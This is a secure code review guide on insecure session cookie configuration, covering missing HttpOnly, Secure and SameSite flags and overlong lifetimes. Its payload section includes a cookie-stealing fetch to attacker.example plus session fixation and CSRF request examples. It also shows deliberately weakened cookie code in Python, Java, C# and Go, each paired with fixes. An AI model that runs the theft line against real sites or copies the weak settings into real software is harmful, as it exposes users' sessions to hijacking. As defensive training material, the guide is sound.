---
title: Review Insecure Cookie Configuration
keywords:
  - security code review
  - cookie security
  - HttpOnly
  - Secure flag
  - SameSite
  - session management
description: How to read code for insecure session and authentication cookie settings missing HttpOnly, Secure, SameSite, or appropriate lifetime controls.
---

## 4.33 - Review Insecure Cookie Configuration

Insecure cookie configuration appears when session identifiers lack HttpOnly, Secure, or SameSite protections, or when lifetime settings keep users logged in longer than policy allows. Review login handlers, session middleware, framework defaults, and deployment descriptors. Trace every cookie the application sets and confirm flags match production transport and CSRF requirements.

## What This Vulnerability Is

Browsers store cookies and send them automatically on matching requests. Session cookies carry authentication state. If JavaScript can read the cookie, a cross-site scripting flaw may steal the session. If the cookie travels over HTTP, network attackers may intercept it. If SameSite is missing or too permissive, cross-site request forgery becomes easier. Overly long or persistent session cookies extend the window for stolen-token abuse.

The unsafe assumption is that HTTPS alone protects sessions, or that framework defaults are sufficient without verification. Cookie flags must be set explicitly per cookie and reviewed whenever session logic changes. Misconfiguration contributes to session hijacking and CSRF risk and aligns with [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) guidance.

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Login success handlers, "remember me," OAuth callbacks, session refresh, logout |
| **Framework config** | `web.xml`, Spring `application.yml`, Django `SESSION_COOKIE_*`, Express session middleware |
| **Missing HttpOnly** | `set_cookie(..., httponly=False)`, `Cookie` without `setHttpOnly(true)` |
| **Missing Secure** | Cookies set without `Secure` in production or behind TLS-terminating proxies |
| **SameSite gaps** | Cross-site flows, embedded widgets, OAuth redirects without deliberate SameSite choice |
| **Overlong lifetime** | Far-future `Expires` or `Max-Age` bypassing idle timeout policy |
| **Logout gaps** | Client cookie cleared but server-side session record still valid |

## Attack Payloads

Use these in authorized tests on login and session endpoints. Abuse scenarios include XSS cookie theft, network capture, and CSRF with permissive SameSite.

### Pattern 1: Missing HttpOnly (XSS theft abuse scenario)

```javascript
// After any XSS on the origin
document.cookie  // returns "session=abc123" when HttpOnly absent
fetch('https://attacker.example/?c='+document.cookie)
```

### Pattern 2: Missing Secure over HTTP

```http
GET http://app.example/ HTTP/1.1
Cookie: session=abc123
```

Cleartext transport exposes the session on untrusted networks.

### Pattern 3: SameSite absent or None without Secure

```http
# Cross-site POST from attacker.example with victim browser
POST https://app.example/transfer HTTP/1.1
Cookie: session=victim_session
Origin: https://attacker.example
```

### Pattern 4: Overly long session lifetime

```http
Set-Cookie: session=abc; Max-Age=31536000; Path=/
```

Stolen cookies remain valid for a year.

### Pattern 5: Session fixation via attacker-set cookie

```http
Set-Cookie: session=attacker_chosen_id; Path=/
# Victim logs in while browser already holds attacker-known id
```

### Pattern 6: Logout without server invalidation

```javascript
document.cookie = "session=; Max-Age=0";  // client cleared
// Server-side session store still accepts session=abc123
```

## Language-Specific Sinks and Dangerous APIs

Search every `Set-Cookie` path and framework session configuration.

### Python

```python
response.set_cookie("auth_token", token, httponly=False, secure=False)
settings.SESSION_COOKIE_HTTPONLY = False
settings.CSRF_COOKIE_SECURE = False
```

Flask `session` defaults; Django `SESSION_COOKIE_HTTPONLY = False`; Starlette `set_cookie` without flags.

### Java

```java
Cookie c = new Cookie("JSESSIONID", id);
c.setHttpOnly(false);
c.setSecure(false);
response.addCookie(c);
```

`server.servlet.session.cookie.http-only=false` in `application.properties`; Spring `CookieSerializer` customizations.

### C#

```csharp
Response.Cookies.Append("session", id);  // default flags may omit HttpOnly/Secure
options.Cookie.HttpOnly = false;
options.Cookie.SecurePolicy = CookieSecurePolicy.None;
```

ASP.NET Core `CookieAuthenticationOptions`; legacy `FormsAuthentication` cookie settings.

### JavaScript (Node.js)

```javascript
res.cookie("session", sid, { httpOnly: false, secure: false, sameSite: false });
cookieSession({ name: "session", secure: false });
```

`express-session` defaults without `cookie.secure` behind TLS terminators.

### Go

```go
http.SetCookie(w, &http.Cookie{Name: "session", Value: sid})  // no HttpOnly/Secure
```

Gorilla sessions, `echo` cookie middleware without explicit flags.

### Servlet deployment descriptors

```xml
<session-config>
  <cookie-config>
    <http-only>false</http-only>
    <secure>false</secure>
  </cookie-config>
</session-config>
```

## Sample Vulnerable Code in Python

```python
from django.conf import settings
from django.http import HttpResponseRedirect
from django.views.decorators.http import require_POST

settings.SESSION_COOKIE_HTTPONLY = False
settings.SESSION_COOKIE_SECURE = False
settings.SESSION_COOKIE_SAMESITE = None

@require_POST
def login(request):
    session_key = create_session(request.POST["username"], request.POST["password"])
    response = HttpResponseRedirect("/dashboard")
    # Explicit weak flags on auth cookie — readable by JS, sent over HTTP, cross-site by default
    response.set_cookie(
        "auth_token",
        session_key,
        httponly=False,
        secure=False,
        samesite=None,
        max_age=60 * 60 * 24 * 365,
    )
    return response
```

## Step-by-Step Review Walkthrough

1. **Find every cookie setter.** Search login success, OAuth callbacks, analytics, CSRF token handlers, and preference endpoints.
2. **Check framework session configuration.** Read Django `SESSION_COOKIE_*`, Flask session settings, and deployment descriptors like `web.xml`.
3. **Verify HttpOnly on session cookies.** Client-side scripts must not read authentication identifiers.
4. **Verify Secure in production.** Cookies must not be sent over cleartext HTTP; confirm proxy headers support Secure behind load balancers.
5. **Review SameSite values.** Choose `Strict`, `Lax`, or `None` (with Secure) based on CSRF posture and cross-site navigation needs.
6. **Inspect lifetime settings.** Persistent sessions should match policy and support server-side invalidation on logout.
7. **Confirm logout clears state.** Server-side session records must invalidate, not only client cookie deletion.

## Risk Impact Analysis

**Session hijacking via XSS.** Without HttpOnly, stolen session cookies let attackers impersonate users after any script injection flaw.

**Network interception.** Cookies without Secure travel over HTTP and may be captured on untrusted networks or during downgrade attacks.

**Cross-site request forgery.** Missing or permissive SameSite makes it easier to send authenticated requests from attacker-controlled pages.

**Extended abuse window.** Overly long cookie lifetimes keep stolen tokens valid long after the user believes they logged out.

**Compliance gaps.** Session handling requirements in PCI DSS and privacy frameworks expect explicit timeout and secure cookie controls.

## Vulnerable Examples in Other Languages

### Java

```java
public void login(HttpServletResponse response, String sessionId) {
    Cookie session = new Cookie("session", sessionId);
    // Missing HttpOnly, Secure, and SameSite — readable by JS and sent over HTTP
    response.addCookie(session);
}

public void rememberMe(HttpServletResponse response, String sessionId) {
    Cookie session = new Cookie("session", sessionId);
    session.setMaxAge(60 * 60 * 24 * 365); // one year — exceeds policy
    response.addCookie(session);
}
```

```xml
<!-- web.xml: http-only set but Secure and SameSite not configured -->
<session-config>
   <cookie-config>
       <http-only>true</http-only>
       <max-age>600</max-age>
   </cookie-config>
</session-config>
```

### C#

```csharp
Response.Cookies.Append("session", sessionId, new CookieOptions
{
    HttpOnly = false,
    Secure = false
});

Response.Cookies.Append("session", longLivedSessionId, new CookieOptions
{
    HttpOnly = false,
    Secure = false,
    Expires = DateTimeOffset.UtcNow.AddYears(1)
});
```

### Go

```go
http.SetCookie(w, &http.Cookie{
    Name:  "session",
    Value: sessionID,
    Path:  "/",
    // HttpOnly, Secure, and SameSite left at zero values
})

http.SetCookie(w, &http.Cookie{
    Name:   "session",
    Value:  longLivedSessionID,
    Path:   "/",
    MaxAge: 60 * 60 * 24 * 365,
})
```

## Fix: Safer Patterns and Libraries to Use

### Python

Configure Flask or Django session cookies with explicit flags.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
)

@require_POST
def login(request):
    session_key = create_session(request.POST["username"], request.POST["password"])
    response = HttpResponseRedirect("/dashboard")
    response.set_cookie(
        "auth_token",
        session_key,
        httponly=True,
        secure=True,
        samesite="Lax",
        max_age=8 * 3600,
    )
    return response
```

Pair Secure cookies with HTTPS enforcement and HSTS. See [Flask session configuration](https://flask.palletsprojects.com/en/stable/config/#SESSION_COOKIE_SECURE) and [Django cookie settings](https://docs.djangoproject.com/en/stable/ref/settings/#session-cookie-secure).

### Java

Set flags explicitly on every auth cookie. Use Spring Boot session properties for container defaults.

```java
public static void setSessionCookie(HttpServletResponse response, String name, String value) {
    Cookie cookie = new Cookie(name, value);
    cookie.setHttpOnly(true);
    cookie.setSecure(true);
    cookie.setPath("/");
    cookie.setAttribute("SameSite", "Strict");
    cookie.setMaxAge(3600);
    response.addCookie(cookie);
}
```

```yaml
# application.yml
server:
  servlet:
    session:
      cookie:
        http-only: true
        secure: true
        same-site: strict
```

See [Servlet Cookie API](https://jakarta.ee/specifications/servlet/6.0/apidocs/jakarta.servlet/jakarta/servlet/http/Cookie.html) and [Spring Boot session cookie properties](https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html#application-properties.server.server.servlet.session.cookie).

### C#

Use `CookieOptions` with consistent flags on authentication handlers.

```csharp
Response.Cookies.Append("AuthToken", token, new CookieOptions
{
    HttpOnly = true,
    Secure = true,
    SameSite = SameSiteMode.Strict,
    Expires = DateTimeOffset.UtcNow.AddHours(8),
    IsEssential = true
});
```

Configure cookie authentication in `Program.cs` with the same flags. See [ASP.NET Core cookie options](https://learn.microsoft.com/en-us/aspnet/core/security/authentication/cookie).

### Go

Set explicit fields on session cookies. Ensure TLS termination sets `X-Forwarded-Proto` for Secure cookies behind load balancers.

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    Path:     "/",
    MaxAge:   3600,
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteStrictMode,
})
```

With [gorilla/sessions](https://github.com/gorilla/sessions), configure store `Options` with production-safe defaults.

## Verify During Review

- Session and authentication cookies set `HttpOnly` and `Secure` in production.
- `SameSite` is chosen deliberately for CSRF and OAuth redirect flows; `None` requires `Secure`.
- Cookie lifetime matches session timeout policy; "remember me" uses separate, scoped cookies when enabled.
- Logout invalidates server-side sessions and clears client cookies.
- Framework defaults were verified, not assumed; deployment descriptors match application code.
- No sensitive session identifiers appear in URL query parameters as a substitute for cookies.

## Reference

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [RFC 6265: HTTP State Management Mechanism](https://www.rfc-editor.org/rfc/rfc6265)
- [Flask session cookie configuration](https://flask.palletsprojects.com/en/stable/config/#SESSION_COOKIE_HTTPONLY)
- [Django session settings](https://docs.djangoproject.com/en/stable/ref/settings/#sessions)
- [Jakarta Servlet Cookie API](https://jakarta.ee/specifications/servlet/6.0/apidocs/jakarta.servlet/jakarta/servlet/http/Cookie.html)
- [Spring Boot server.servlet.session.cookie](https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html#application-properties.server.server.servlet.session.cookie)
- [ASP.NET Core cookie authentication](https://learn.microsoft.com/en-us/aspnet/core/security/authentication/cookie)
- [Go net/http Cookie](https://pkg.go.dev/net/http#Cookie)
